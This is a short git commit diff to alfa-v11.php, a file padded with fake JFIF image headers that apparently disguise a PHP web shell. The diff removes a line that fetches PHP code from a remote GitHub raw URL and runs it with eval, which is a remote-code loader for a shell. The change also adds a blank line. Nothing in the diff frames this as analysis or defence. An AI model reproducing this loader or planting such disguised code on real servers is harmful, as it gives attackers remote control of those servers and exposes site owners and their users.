20c6dd4e6acc31c3a654363371ee34ca8ffec4a7
rendihidayat683 <rendihidayat683@gmail.com>
2025-08-10 07:29:21 +0700

    Update alfa-v11.php

--- alfa-v11.php
+++ alfa-v11.php
@@ -4,7 +4,6 @@
 JFIF      $
  JFIF      $
  JFIF      $
-<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php"));?>
 JFIF      $
 JFIF      $
 
@@ -20,6 +19,7 @@ exit;
   JFIF      $
 JFIF      $
  JFIF      $
+
 
 
 
